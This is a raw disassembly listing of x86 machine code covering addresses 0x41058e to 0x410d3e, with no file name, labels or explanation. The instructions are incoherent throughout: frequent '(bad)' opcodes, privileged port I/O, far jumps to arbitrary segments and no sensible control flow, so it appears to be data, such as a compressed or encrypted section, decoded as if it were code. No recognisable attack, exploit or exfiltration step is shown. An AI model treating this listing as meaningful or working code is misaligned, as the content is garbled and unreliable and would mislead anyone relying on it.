  41058e:	mov    ch,0x4e
  410590:	pop    edx
  410591:	enter  0xe09e,0x65
  410595:	lds    ecx,FWORD PTR [edx+0x33]
  410598:	loope  0x4105a1
  41059a:	xchg   esp,eax
  41059b:	mov    esi,0x7fe409b5
  4105a0:	dec    ecx
  4105a1:	jg     0x4105e0
  4105a3:	cmp    bl,dl
  4105a5:	and    DWORD PTR [ebp+ecx*8+0x58dc1037],ebp
  4105ac:	and    ebx,esi
  4105ae:	int    0x67
  4105b0:	inc    esi
  4105b1:	mov    ds:0x42f68519,eax
  4105b6:	sub    eax,esi
  4105b8:	xchg   esp,eax
  4105b9:	cdq    
  4105ba:	pop    es
  4105bb:	into   
  4105bc:	(bad)  
  4105bd:	int3   
  4105be:	leave  
  4105bf:	jmp    0x57a665cc
  4105c4:	not    DWORD PTR [esi+0x7e895aff]
  4105ca:	xchg   edx,eax
  4105cb:	jne    0x4105e2
  4105cd:	nop
  4105ce:	and    dl,BYTE PTR [ebp+0x1b]
  4105d1:	cvtdq2ps xmm0,xmm0
  4105d4:	push   edi
  4105d5:	cli    
  4105d6:	xor    edx,DWORD PTR [eax]
  4105d8:	fldenv [edi-0xb55383e]
  4105de:	inc    esp
  4105df:	shl    DWORD PTR [ebp+0xb12fa39],1
  4105e5:	mov    ebx,0x9b39f395
  4105ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105eb:	mov    eax,0x446f3823
  4105f0:	or     cl,dh
  4105f2:	cs mov ah,0xc8
  4105f5:	mov    dl,0x1e
  4105f7:	mov    bl,0x7
  4105f9:	cs jns 0x410621
  4105fc:	sub    dh,al
  4105fe:	pop    ecx
  4105ff:	stc    
  410600:	in     al,dx
  410601:	jno    0x4105c1
  410603:	or     BYTE PTR [ebx+edx*8],bl
  410606:	(bad)  
  410607:	adc    edx,DWORD PTR [ebp+0x37]
  41060a:	(bad)  
  41060b:	jle    0x41058d
  41060d:	and    eax,0xdf4eff1e
  410612:	xor    DWORD PTR [edi-0x597df97f],eax
  410618:	into   
  410619:	push   ds
  41061a:	dec    edx
  41061b:	stos   DWORD PTR es:[edi],eax
  41061c:	shl    BYTE PTR [edi],cl
  41061e:	push   0xbb253aa3
  410623:	mov    ebp,0xebe27e71
  410628:	dec    ebp
  410629:	push   cs
  41062a:	mov    edi,0xecb40cde
  41062f:	ss pushf 
  410631:	xchg   edx,eax
  410632:	in     al,0x9f
  410634:	jns    0x410698
  410636:	pop    esp
  410637:	fisub  WORD PTR [bp+0xb90]
  41063c:	out    0x19,eax
  41063e:	mov    ecx,0x328f9740
  410643:	arpl   WORD PTR [edi-0x44866dfe],ax
  410649:	out    dx,eax
  41064a:	in     eax,dx
  41064b:	add    DWORD PTR [eax+0x6f],eax
  41064e:	and    DWORD PTR ds:[edx-0x54],esi
  410652:	xchg   esi,eax
  410653:	imul   eax,DWORD PTR [ecx-0x1c],0x57b5013c
  41065a:	pushf  
  41065b:	hlt    
  41065c:	cmp    bl,BYTE PTR [eax-0x54ffab2b]
  410662:	pop    ebx
  410663:	adc    edi,ebp
  410665:	xor    DWORD PTR [ebx],ecx
  410667:	iret   
  410668:	cmp    esi,DWORD PTR [edx]
  41066a:	jns    0x410699
  41066c:	cmp    ebx,esi
  41066e:	jnp    0x4106bb
  410670:	jle    0x41067e
  410672:	fisubr DWORD PTR [edx+ecx*4+0x2d]
  410676:	mov    WORD PTR [edx-0x27b74732],ss
  41067c:	bound  eax,QWORD PTR [ecx-0x73]
  41067f:	jno    0x4106d6
  410681:	add    BYTE PTR [edi],bl
  410683:	(bad)  
  410684:	pop    eax
  410685:	lods   al,BYTE PTR ds:[esi]
  410686:	mov    ch,0xea
  410688:	push   ss
  410689:	jb     0x410633
  41068b:	push   DWORD PTR [edi]
  41068d:	test   al,0xe8
  41068f:	fnstcw WORD PTR [ebp+0x52]
  410692:	test   DWORD PTR [ecx],edx
  410694:	scas   al,BYTE PTR es:[edi]
  410695:	fdivr  QWORD PTR [edx+ebp*1]
  410698:	xchg   edi,edx
  41069a:	int3   
  41069b:	imul   edi,DWORD PTR [esp+eiz*8],0x64
  41069f:	and    ecx,ebx
  4106a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106a2:	and    esp,ebp
  4106a4:	stos   DWORD PTR es:[edi],eax
  4106a5:	out    0xcb,al
  4106a7:	cdq    
  4106a8:	add    ebp,edi
  4106aa:	mov    dl,0x1e
  4106ac:	jge    0x4106b6
  4106ae:	sub    eax,0x8d17a5ff
  4106b3:	jle    0x410703
  4106b5:	popf   
  4106b6:	fstp   DWORD PTR [edx+0x3c]
  4106b9:	sub    ax,0xfff5
  4106bd:	mov    ecx,ebp
  4106bf:	dec    esp
  4106c0:	out    dx,al
  4106c1:	dec    ebx
  4106c2:	jnp    0x4106ec
  4106c4:	or     BYTE PTR [edi+0x10bf142],bl
  4106ca:	nop
  4106cb:	mov    edx,0x3f9765c8
  4106d0:	je     0x410694
  4106d2:	xchg   DWORD PTR [edx],edi
  4106d4:	mov    ebp,0xa25f2185
  4106d9:	mov    cl,BYTE PTR [edx+ecx*2]
  4106dc:	mov    cl,0x6b
  4106de:	out    0xc1,al
  4106e0:	fisub  WORD PTR [eax-0x7bd7d1e]
  4106e6:	or     ebp,DWORD PTR ds:0x12dd1ec6
  4106ec:	(bad)  
  4106ed:	jae    0x410672
  4106ef:	lahf   
  4106f0:	sub    eax,0x4395af9a
  4106f5:	ss push ecx
  4106f7:	nop
  4106f8:	xor    al,0x9e
  4106fa:	lock pop edi
  4106fc:	loope  0x41076a
  4106fe:	jns    0x410720
  410700:	pushf  
  410701:	push   eax
  410702:	arpl   WORD PTR [esi-0x7b2f87fa],bx
  410708:	out    0x14,al
  41070a:	push   0x5b
  41070c:	mov    WORD PTR [ebp-0x6f],ds
  41070f:	xchg   edi,eax
  410710:	addr16 pop ebp
  410712:	push   esp
  410713:	jo     0x4106ff
  410715:	xor    eax,0xd2c3234d
  41071a:	pop    ebx
  41071b:	push   ecx
  41071c:	iret   
  41071d:	lds    ebx,FWORD PTR [ebp+0x974e0a9]
  410723:	pop    ss
  410724:	xor    BYTE PTR [eax-0x1688f6d],bl
  41072a:	(bad)  
  41072c:	outs   dx,BYTE PTR es:[esi]
  41072e:	push   esi
  41072f:	sti    
  410730:	dec    ecx
  410731:	test   eax,0xe173ba06
  410736:	xor    eax,0xb5e54b2d
  41073b:	inc    ebx
  41073c:	loope  0x4106e1
  41073e:	mov    ?,WORD PTR [ebx]
  410740:	loope  0x4106ee
  410742:	rcl    DWORD PTR [edi-0x15],1
  410745:	sub    al,BYTE PTR [edx]
  410747:	mov    al,0xf8
  410749:	ror    DWORD PTR [edi+0x6e],0x2c
  41074d:	fstp   DWORD PTR [eax+ecx*8+0x6b]
  410751:	imul   esi,DWORD PTR [ebx+0x155480e3],0xffffff9e
  410758:	cmp    edi,DWORD PTR [eax+0x3f067972]
  41075e:	pushf  
  41075f:	lods   eax,DWORD PTR ds:[esi]
  410760:	xor    BYTE PTR [esi+0x7d],bl
  410763:	inc    eax
  410764:	pop    DWORD PTR [edi+edi*2-0x11]
  410768:	mov    DWORD PTR [ebx+0x5e4139e1],0x618cde34
  410772:	aaa    
  410773:	mov    eax,0x5d615dea
  410778:	push   eax
  410779:	jnp    0x4107e1
  41077b:	cmp    eax,esp
  41077d:	call   0x771deb77
  410782:	loope  0x4107fb
  410784:	push   ebx
  410785:	sar    BYTE PTR [edx],1
  410787:	dec    eax
  410788:	pop    edx
  410789:	mov    cl,0x1f
  41078b:	neg    DWORD PTR [eax+eiz*2-0x68c76b63]
  410792:	out    dx,al
  410793:	pop    esp
  410794:	mul    DWORD PTR [ecx+ecx*4-0x2d]
  410798:	shr    DWORD PTR [ebx],cl
  41079a:	sbb    bl,bh
  41079c:	add    BYTE PTR [edx+esi*1+0x1e92c934],ch
  4107a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107a4:	mov    ds:0xebaed8a5,eax
  4107a9:	inc    edx
  4107aa:	imul   esp,DWORD PTR gs:[edx-0x43],0x49
  4107af:	inc    eax
  4107b0:	cdq    
  4107b1:	push   ebx
  4107b2:	xchg   edx,eax
  4107b3:	sbb    al,0x4d
  4107b5:	retf   
  4107b6:	xchg   esi,eax
  4107b7:	sub    eax,ebx
  4107b9:	divps  xmm0,XMMWORD PTR [ebx-0x38]
  4107bd:	sbb    eax,0x350da771
  4107c2:	jns    0x410767
  4107c4:	xchg   edi,eax
  4107c5:	cmp    eax,0x42701c90
  4107ca:	inc    esi
  4107cb:	jecxz  0x41075e
  4107cd:	das    
  4107ce:	(bad)  
  4107d0:	cs out dx,eax
  4107d2:	aam    0x9e
  4107d4:	push   ecx
  4107d5:	add    al,0xd1
  4107d7:	inc    esp
  4107d8:	jg     0x410786
  4107da:	sub    al,0x28
  4107dc:	fstp   DWORD PTR [edx]
  4107de:	aaa    
  4107df:	xor    DWORD PTR [ebx-0x8931352],0xfffffff8
  4107e6:	fmul   DWORD PTR [edi-0x6e]
  4107e9:	rol    BYTE PTR fs:[edx],1
  4107ec:	push   ds
  4107ed:	jb     0x410825
  4107ef:	ins    BYTE PTR es:[edi],dx
  4107f0:	and    esp,DWORD PTR [edi+0x1e]
  4107f3:	mov    dl,0x3d
  4107f5:	mov    dl,0x77
  4107f7:	xor    edx,DWORD PTR fs:[edi+ebp*2+0x74]
  4107fc:	xlat   BYTE PTR ds:[ebx]
  4107fd:	cmp    eax,0xf59890ec
  410802:	add    eax,0x96fc8deb
  410807:	pop    ecx
  410808:	in     al,0x1
  41080a:	div    edx
  41080c:	inc    ebx
  41080d:	iret   
  41080e:	mov    al,ds:0x331519a
  410813:	jo     0x410870
  410815:	xor    cl,BYTE PTR [edi+0x3b]
  410818:	imul   edx,esp,0xffffff88
  41081b:	iret   
  41081c:	push   edx
  41081d:	shl    DWORD PTR [esi],cl
  41081f:	aaa    
  410820:	sub    DWORD PTR [bp-0x3f84],0x25889299
  410829:	jg     0x410845
  41082b:	stc    
  41082c:	mov    eax,ds:0xa8e54b9f
  410831:	cmp    ebx,ecx
  410833:	int3   
  410834:	rcl    BYTE PTR [ebp-0x2a23c9e3],0x69
  41083b:	iret   
  41083c:	xor    bh,BYTE PTR [eax-0x16]
  41083f:	inc    ebp
  410840:	addr16 xchg esi,eax
  410842:	cmp    DWORD PTR [eax+edx*8+0x33b2ebfc],ecx
  410849:	and    eax,0x49dcd627
  41084e:	and    ebp,DWORD PTR [eax-0x5e65b98c]
  410854:	push   eax
  410855:	leave  
  410856:	lea    ecx,[edi-0x46]
  410859:	retf   0x5526
  41085c:	das    
  41085d:	pop    ebx
  41085e:	adc    BYTE PTR [eax],0xf7
  410861:	jo     0x41084b
  410863:	lea    eax,[ebx+0x44e0382c]
  410869:	mov    BYTE PTR [edi+0x53],cl
  41086c:	loop   0x410837
  41086e:	mov    ah,BYTE PTR [edi+0x15]
  410871:	jns    0x41089c
  410873:	sub    eax,edi
  410875:	mov    DWORD PTR [edx],edx
  410877:	sbb    al,ch
  410879:	add    BYTE PTR [ecx+0x33e8ec88],0x27
  410880:	enterw 0xcf7b,0x1b
  410885:	mov    DWORD PTR [ebp-0x49],ebx
  410888:	gs inc edx
  41088a:	addr16 aam 0x9d
  41088d:	adc    DWORD PTR [esi+0x30ae5f80],esi
  410893:	mov    edi,0x63eb20ff
  410898:	add    esi,DWORD PTR [ebx+0x7]
  41089b:	or     al,BYTE PTR [ebx]
  41089d:	xchg   DWORD PTR [esi-0x7],ebp
  4108a0:	nop
  4108a1:	retf   0x501b
  4108a4:	jp     0x41088a
  4108a6:	mov    eax,ds:0x806cc98
  4108ab:	jns    0x410885
  4108ad:	xchg   al,al
  4108af:	xor    dh,BYTE PTR ds:0x5b1d9d5c
  4108b5:	stos   BYTE PTR es:[edi],al
  4108b6:	ss push 0x1f
  4108b9:	cmp    BYTE PTR [eax-0xcafd2b1],al
  4108bf:	inc    ebx
  4108c0:	rol    BYTE PTR [eax],0x54
  4108c3:	sub    ebp,edx
  4108c5:	xchg   ecx,eax
  4108c6:	dec    DWORD PTR fs:[ebp-0x71]
  4108ca:	(bad)  
  4108cb:	stos   DWORD PTR es:[edi],eax
  4108cc:	mov    bh,0x12
  4108ce:	in     al,0x76
  4108d0:	mov    DWORD PTR [esi+0x77],ecx
  4108d3:	fwait
  4108d4:	mov    cl,0xaf
  4108d6:	shl    DWORD PTR [ebp-0x3b115a49],1
  4108dc:	idiv   BYTE PTR [ebx-0x793035fe]
  4108e2:	jbe    0x4108e8
  4108e4:	pop    esp
  4108e5:	push   ds
  4108e6:	xchg   DWORD PTR [eax-0x4f],esp
  4108e9:	in     al,0x8b
  4108eb:	test   DWORD PTR [ebx],esp
  4108ed:	sub    eax,0xac8146f4
  4108f2:	in     eax,0xee
  4108f4:	mov    dh,0xad
  4108f6:	and    bl,BYTE PTR [edi-0x25584ac7]
  4108fc:	fmul   QWORD PTR [eax]
  4108fe:	(bad)  
  4108ff:	jb     0x4108f2
  410901:	pop    edx
  410902:	ret    
  410903:	nop
  410904:	in     eax,dx
  410905:	mov    ebp,0xf1b55322
  41090a:	add    esp,DWORD PTR [ebx]
  41090c:	clc    
  41090d:	lea    ecx,[ebx+0x7]
  410910:	add    ebp,0x24e53b73
  410916:	jbe    0x410905
  410918:	std    
  410919:	and    bl,BYTE PTR [ecx+0x2ace06cc]
  41091f:	mov    eax,ds:0xbea576b3
  410924:	inc    edx
  410925:	mov    DWORD PTR [ebp+edx*4-0x1c],ebp
  410929:	push   0xf0542c84
  41092e:	jno    0x410916
  410930:	cmp    eax,0x6e51e78e
  410935:	scas   al,BYTE PTR es:[edi]
  410936:	lea    esi,[ebx+0x3b]
  410939:	mov    cl,0x9d
  41093b:	push   ss
  41093c:	pop    ds
  41093d:	fidiv  WORD PTR [edx]
  41093f:	ror    BYTE PTR ds:0xd7107586,1
  410945:	pushf  
  410946:	in     al,0xb2
  410948:	pop    ebx
  410949:	dec    edi
  41094a:	add    DWORD PTR [edx-0x2d],edx
  41094d:	pop    esp
  41094e:	adc    eax,0xbb3eed42
  410953:	dec    edx
  410954:	pop    esp
  410955:	lods   eax,DWORD PTR ds:[esi]
  410956:	and    al,0xc2
  410958:	lods   al,BYTE PTR ds:[esi]
  410959:	into   
  41095a:	lds    ebx,FWORD PTR [ecx+0x6]
  41095d:	jg     0x4109c8
  41095f:	out    0x8a,eax
  410961:	pop    ebp
  410962:	xor    ecx,ebp
  410964:	xor    BYTE PTR [ecx+0x14],0x6c
  410968:	stc    
  410969:	fsubp  st(3),st
  41096b:	pop    ds
  41096c:	jg     0x4109a0
  41096e:	xchg   esp,eax
  41096f:	jne    0x4109ed
  410971:	mov    eax,edx
  410973:	int3   
  410974:	jle    0x4109b0
  410976:	lds    esi,FWORD PTR [eax-0x51c01829]
  41097c:	cwde   
  41097d:	sub    BYTE PTR [eax+ebx*1],al
  410980:	dec    edi
  410981:	mov    dl,0xd8
  410983:	inc    esi
  410984:	xor    BYTE PTR ds:0x5b4a831b,0x5f
  41098b:	pop    ss
  41098c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41098d:	dec    ecx
  41098e:	cmp    BYTE PTR [ebx+edi*8],al
  410991:	pop    ecx
  410992:	ss dec eax
  410994:	mov    dh,0xf0
  410996:	and    eax,0x458dc59d
  41099b:	mov    bl,0x13
  41099d:	retf   0x7fe1
  4109a0:	ja     0x410a11
  4109a2:	xor    dh,al
  4109a4:	add    ebx,DWORD PTR [ecx-0x243e4a77]
  4109aa:	(bad)  
  4109ab:	js     0x4109a7
  4109ad:	push   0xf290febf
  4109b2:	outs   dx,DWORD PTR ds:[esi]
  4109b3:	daa    
  4109b4:	xor    al,0x0
  4109b6:	xor    bh,BYTE PTR [edx]
  4109b8:	xchg   dl,dl
  4109ba:	add    eax,0xbed29b42
  4109bf:	push   ecx
  4109c0:	jle    0x410972
  4109c2:	add    al,0x5a
  4109c4:	sahf   
  4109c5:	rcr    DWORD PTR [edx],0x2f
  4109c8:	dec    ebx
  4109c9:	retf   0xbac2
  4109cc:	aam    0xcc
  4109ce:	in     eax,0x8c
  4109d0:	scas   eax,DWORD PTR es:[edi]
  4109d1:	inc    esp
  4109d2:	icebp  
  4109d3:	xor    DWORD PTR [eax+esi*4+0x2043946b],eax
  4109da:	(bad)  
  4109db:	pusha  
  4109dc:	or     cl,BYTE PTR [edi]
  4109de:	pop    esi
  4109df:	push   edi
  4109e0:	dec    ebx
  4109e1:	and    BYTE PTR [edx+esi*4+0x41],0x7a
  4109e6:	pusha  
  4109e7:	dec    esi
  4109e8:	mov    edi,0xe2125afd
  4109ed:	inc    eax
  4109ee:	sahf   
  4109ef:	test   ebx,0xea1e04fc
  4109f5:	ja     0x4109c2
  4109f7:	ret    
  4109f8:	xchg   ebp,eax
  4109f9:	sbb    DWORD PTR [ebx+ecx*8+0xe],ebp
  4109fd:	push   0xffffffce
  4109ff:	imul   esp,DWORD PTR [ebp+0x46],0xe935006f
  410a06:	fwait
  410a07:	cmp    al,dh
  410a09:	sbb    bl,BYTE PTR [esi+0x47]
  410a0c:	in     eax,dx
  410a0d:	js     0x410a0e
  410a0f:	inc    esp
  410a10:	outs   dx,DWORD PTR ds:[esi]
  410a11:	(bad)  
  410a13:	mov    ah,0x93
  410a15:	icebp  
  410a16:	pop    edi
  410a17:	and    eax,0x470512b0
  410a1c:	int3   
  410a1d:	sahf   
  410a1e:	inc    ebx
  410a1f:	fadd   st,st(2)
  410a21:	cli    
  410a22:	int3   
  410a23:	iret   
  410a24:	enter  0x7d34,0xf8
  410a28:	or     DWORD PTR [ebx-0x6b],ebp
  410a2b:	push   ds
  410a2c:	sbb    ch,BYTE PTR [esi+0x4ffb2a49]
  410a32:	call   0x346dc8ff
  410a37:	dec    ebp
  410a38:	repnz daa 
  410a3a:	(bad)  [ebp-0x1f]
  410a3d:	jmp    0xd46ec558
  410a42:	pushf  
  410a43:	fidiv  DWORD PTR [eax]
  410a45:	cmc    
  410a46:	jnp    0x410a04
  410a48:	in     eax,dx
  410a49:	inc    esi
  410a4a:	cmp    eax,0xec0d1b77
  410a4f:	in     eax,0x7e
  410a51:	pop    edx
  410a52:	cwde   
  410a53:	mov    edi,0xa077b179
  410a58:	pop    esp
  410a59:	aaa    
  410a5a:	sub    BYTE PTR [eax+0x4a24cc6],0x51
  410a61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a62:	jp     0x410a4d
  410a64:	xchg   BYTE PTR [eax+ebp*1-0x6d8bd674],bl
  410a6b:	ja     0x410aae
  410a6d:	test   al,0x27
  410a6f:	jmp    0x3c19:0x8a4a060f
  410a76:	sub    al,0x7
  410a78:	lahf   
  410a79:	sbb    bh,BYTE PTR [esi]
  410a7b:	sbb    DWORD PTR [eax],ebp
  410a7d:	out    dx,al
  410a7e:	inc    ebp
  410a7f:	scas   al,BYTE PTR es:[edi]
  410a80:	ds ss dec esp
  410a83:	push   DWORD PTR ds:0xb5547cc0
  410a89:	clc    
  410a8a:	xchg   esp,eax
  410a8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a8c:	mov    ch,0xcc
  410a8e:	xchg   ebx,eax
  410a8f:	in     al,0xb4
  410a91:	std    
  410a92:	in     eax,0xd
  410a94:	inc    edi
  410a95:	jno    0x410a43
  410a97:	push   ebp
  410a98:	inc    ebp
  410a99:	inc    edi
  410a9a:	xor    BYTE PTR [edx-0x1f14910a],dl
  410aa0:	push   ds
  410aa1:	test   eax,0xf3caaba5
  410aa6:	xchg   DWORD PTR [ebp-0x4af03c14],esi
  410aac:	bound  eax,QWORD PTR [esi+0x2535e0b0]
  410ab2:	push   eax
  410ab3:	dec    edx
  410ab4:	aaa    
  410ab5:	dec    eax
  410ab6:	loope  0x410b0b
  410ab8:	fisttp DWORD PTR [edx]
  410aba:	in     eax,dx
  410abb:	sbb    eax,0xba6fbba8
  410ac0:	sub    bh,bh
  410ac2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ac4:	push   edi
  410ac5:	sbb    al,0xb8
  410ac7:	fs push es
  410ac9:	cdq    
  410aca:	aas    
  410acb:	mov    eax,0x2320e3ff
  410ad0:	cmp    al,0x4e
  410ad2:	dec    edx
  410ad3:	fs cmp al,ah
  410ad6:	mov    edx,0x28bcad09
  410adb:	inc    ebx
  410adc:	sbb    DWORD PTR [ecx],eax
  410ade:	std    
  410adf:	cmp    dl,BYTE PTR [eax+0x2f274afa]
  410ae5:	mov    esp,0xb37b1b70
  410aea:	test   eax,0x7ac516d7
  410aef:	aaa    
  410af0:	jns    0x410a77
  410af2:	mov    ds:0x5cfd9739,al
  410af7:	mov    bl,0x69
  410af9:	and    ah,BYTE PTR [edx-0x80]
  410afc:	pusha  
  410afd:	sub    BYTE PTR [ebp+0x5f5dfde2],ah
  410b03:	fisttp QWORD PTR [edx-0x55]
  410b06:	jnp    0x410b42
  410b08:	ja     0x410aeb
  410b0a:	and    dl,BYTE PTR [eax+0xa]
  410b0d:	(bad)  
  410b0e:	cld    
  410b0f:	jb     0x410b4f
  410b11:	jae    0x410aa2
  410b13:	and    eax,0x521227d8
  410b18:	out    dx,al
  410b19:	addr16 inc eax
  410b1b:	addr16 in al,dx
  410b1d:	jge    0x410b97
  410b1f:	(bad)  
  410b20:	(bad)  
  410b21:	mov    eax,ds:0xe58de94c
  410b26:	mov    ah,0xec
  410b28:	sub    dh,0x30
  410b2b:	jno    0x410b9d
  410b2d:	cmp    bh,dh
  410b2f:	sti    
  410b30:	sub    al,0x91
  410b32:	fiadd  WORD PTR [eax+0x32928f78]
  410b38:	mov    ch,0xa1
  410b3a:	pop    eax
  410b3b:	fcom   QWORD PTR [ecx-0x21]
  410b3e:	repnz cs push ss
  410b41:	mov    bl,ah
  410b43:	mov    ebx,0x290536a2
  410b48:	pusha  
  410b49:	add    DWORD PTR [ecx],esp
  410b4b:	dec    esp
  410b4c:	sti    
  410b4d:	xchg   edi,eax
  410b4e:	inc    edi
  410b4f:	aas    
  410b50:	loop   0x410b2b
  410b52:	mov    esp,0x763570ff
  410b57:	add    al,0x69
  410b59:	mov    esi,0xc44579c0
  410b5e:	jns    0x410b3c
  410b60:	mov    bh,0x4d
  410b62:	ret    0xd612
  410b65:	scas   al,BYTE PTR es:[edi]
  410b66:	or     eax,0xaff2a759
  410b6b:	or     esi,DWORD PTR [bx+di]
  410b6e:	sub    al,BYTE PTR [edi+0x26]
  410b71:	les    esi,FWORD PTR [edi+0x74]
  410b74:	inc    eax
  410b75:	jl     0x410bc3
  410b77:	add    ch,BYTE PTR gs:[ebx+0x4f]
  410b7b:	jne    0x410ba5
  410b7d:	add    ebx,DWORD PTR [edx+0x5]
  410b80:	out    dx,al
  410b81:	in     al,dx
  410b82:	dec    ebp
  410b83:	inc    ecx
  410b84:	push   eax
  410b85:	lahf   
  410b86:	stos   BYTE PTR es:[edi],al
  410b87:	mov    bl,0x26
  410b89:	add    esp,0x51
  410b8c:	fldlg2 
  410b8e:	shl    DWORD PTR [esi-0xd],cl
  410b91:	mov    al,ds:0xc26d3f24
  410b96:	popf   
  410b97:	adc    eax,0x6506effb
  410b9c:	test   eax,0xd7a4212a
  410ba1:	sbb    BYTE PTR [edi+0x61],0x2f
  410ba5:	cmp    ebp,DWORD PTR [ebx-0x11]
  410ba8:	and    DWORD PTR [esi],edx
  410baa:	aam    0x72
  410bac:	sti    
  410bad:	push   esi
  410bae:	mov    ch,BYTE PTR [edx+ebx*1]
  410bb1:	jo     0x410bd5
  410bb3:	xor    ecx,0x59
  410bb6:	push   0x3b
  410bb8:	adc    al,0xab
  410bba:	sub    BYTE PTR [ebx],ah
  410bbc:	aaa    
  410bbd:	sbb    DWORD PTR [eax-0x48117cd1],eax
  410bc3:	out    0x2,al
  410bc5:	pop    ebx
  410bc6:	std    
  410bc7:	sbb    eax,0xf03e8b82
  410bcc:	mov    bl,0x4b
  410bce:	xchg   ecx,eax
  410bcf:	inc    esp
  410bd0:	inc    ecx
  410bd1:	out    dx,eax
  410bd2:	cmp    DWORD PTR [edx+0x53],ebx
  410bd5:	cwde   
  410bd6:	aaa    
  410bd7:	and    dl,ch
  410bd9:	cs dec ecx
  410bdb:	rol    ecx,cl
  410bdd:	adc    DWORD PTR [edx-0x65],ecx
  410be0:	adc    DWORD PTR [esi-0x46],esi
  410be3:	mov    ah,dl
  410be5:	sub    eax,0x2d04c11f
  410bea:	inc    esi
  410beb:	test   al,0x93
  410bed:	arpl   bx,di
  410bef:	mov    al,ds:0x9b37bea4
  410bf4:	arpl   WORD PTR [edi+0x1581811d],di
  410bfa:	pushf  
  410bfb:	push   ebp
  410bfc:	fild   WORD PTR [esi]
  410bfe:	sub    esi,DWORD PTR [edx+0x262588b9]
  410c04:	dec    ecx
  410c05:	push   es
  410c06:	pop    esi
  410c07:	fwait
  410c08:	sub    eax,DWORD PTR [edx-0x686ae2e7]
  410c0e:	mov    cl,0x6a
  410c10:	pop    edx
  410c11:	(bad)  
  410c13:	data16 jbe 0x410c6c
  410c16:	sub    eax,0x3779ca06
  410c1b:	xor    BYTE PTR [edi-0x534b7d3c],dh
  410c21:	das    
  410c22:	jae    0x410c34
  410c24:	jmp    0x70c1:0xe8a98b89
  410c2b:	mov    dl,0x85
  410c2d:	mov    bl,0xd6
  410c2f:	mov    esp,0xa74459b8
  410c34:	les    eax,FWORD PTR [esi-0x53]
  410c37:	sbb    BYTE PTR [edi-0x38],bh
  410c3a:	xchg   esp,eax
  410c3b:	mov    dl,0x8
  410c3d:	call   0x24e9:0xc7fe67fd
  410c44:	dec    esp
  410c45:	call   0x751cd52
  410c4a:	fisubr WORD PTR [ebx-0x25934119]
  410c50:	cmp    DWORD PTR [esi],esi
  410c52:	std    
  410c53:	jl     0x410c37
  410c55:	inc    edx
  410c56:	mov    ch,0xea
  410c58:	scas   al,BYTE PTR es:[edi]
  410c59:	xchg   edi,eax
  410c5a:	xchg   edi,eax
  410c5b:	mov    ds:0xd3daf26f,al
  410c60:	aad    0x89
  410c62:	dec    ecx
  410c63:	mov    cl,0xae
  410c65:	je     0x410c8e
  410c67:	sti    
  410c68:	sub    al,0xcb
  410c6a:	jae    0x410bfd
  410c6c:	xor    BYTE PTR [ebx+0x28],ch
  410c6f:	into   
  410c70:	push   ebp
  410c71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c72:	mov    eax,0x95598adf
  410c77:	xchg   ebp,eax
  410c78:	add    DWORD PTR [edx],esi
  410c7a:	or     BYTE PTR [ecx],bh
  410c7c:	das    
  410c7d:	inc    ecx
  410c7e:	test   BYTE PTR [ebp+edi*1-0x6e],dl
  410c82:	into   
  410c83:	inc    esi
  410c84:	dec    ecx
  410c85:	(bad)  [edx]
  410c87:	imul   edi,ebp,0x24
  410c8a:	fdiv   QWORD PTR ss:[ecx-0x170650b9]
  410c91:	xor    ebx,ebp
  410c93:	push   edi
  410c94:	adc    BYTE PTR [ecx+0x56],0x24
  410c98:	adc    al,0x3d
  410c9a:	call   0x2e5c3d6a
  410c9f:	mov    ah,0x25
  410ca1:	push   esi
  410ca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ca3:	pop    es
  410ca4:	mov    edi,0xc1fc2b97
  410ca9:	pop    ss
  410caa:	mov    DWORD PTR [esi+0x11],edx
  410cad:	mov    DWORD PTR [esi],esi
  410caf:	(bad)  
  410cb0:	in     eax,0xf1
  410cb2:	jns    0x410ce6
  410cb4:	push   ecx
  410cb5:	push   ecx
  410cb6:	pop    ecx
  410cb7:	aas    
  410cb8:	push   ecx
  410cb9:	leave  
  410cba:	imul   DWORD PTR [edx+0x71]
  410cbd:	xchg   DWORD PTR [edx+0x5965877d],esi
  410cc3:	int    0x6c
  410cc5:	push   edx
  410cc6:	mov    ds:0x7371faa2,eax
  410ccb:	or     BYTE PTR [esi],dl
  410ccd:	sbb    BYTE PTR fs:[edi],dh
  410cd0:	mov    bh,0xb3
  410cd2:	inc    ebp
  410cd3:	mov    WORD PTR [edx],es
  410cd5:	push   ds
  410cd6:	dec    ebp
  410cd7:	jmp    0x479ec945
  410cdc:	std    
  410cdd:	sbb    esi,edi
  410cdf:	adc    eax,DWORD PTR [esi]
  410ce1:	dec    edx
  410ce2:	rcl    DWORD PTR ds:0x3d9bc4dd,cl
  410ce8:	lock push eax
  410cea:	mov    ds:0x32646670,eax
  410cef:	loop   0x410d39
  410cf1:	cmp    ebp,0x92765af3
  410cf7:	jmp    0xa317:0x4a1aeffc
  410cfe:	lods   eax,DWORD PTR ds:[esi]
  410cff:	cmp    DWORD PTR [esi+eiz*2-0x241d921d],ecx
  410d06:	int3   
  410d07:	mov    ah,bh
  410d09:	xor    al,0x24
  410d0b:	stc    
  410d0c:	inc    ecx
  410d0d:	fs ret 
  410d0f:	lea    esi,[ebx]
  410d11:	sahf   
  410d12:	mov    ch,0xb3
  410d14:	sub    DWORD PTR [edi+0x333b3415],0x46
  410d1b:	pop    es
  410d1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d1d:	dec    edi
  410d1e:	sbb    DWORD PTR [ebx],eax
  410d20:	fild   DWORD PTR [eax+0x2ed2ec00]
  410d26:	iret   
  410d27:	mov    WORD PTR ds:0x6c76eddd,gs
  410d2d:	or     eax,0x186dbb25
  410d32:	xchg   esp,eax
  410d33:	lods   al,BYTE PTR ds:[esi]
  410d34:	test   edx,ecx
  410d36:	(bad)  
  410d37:	(bad)  
  410d38:	and    edx,DWORD PTR [edx+0x5dcc6b38]
  410d3e:	sbb    dh,BYTE PTR [ebp+ebx*8-0x4f70f0ba]
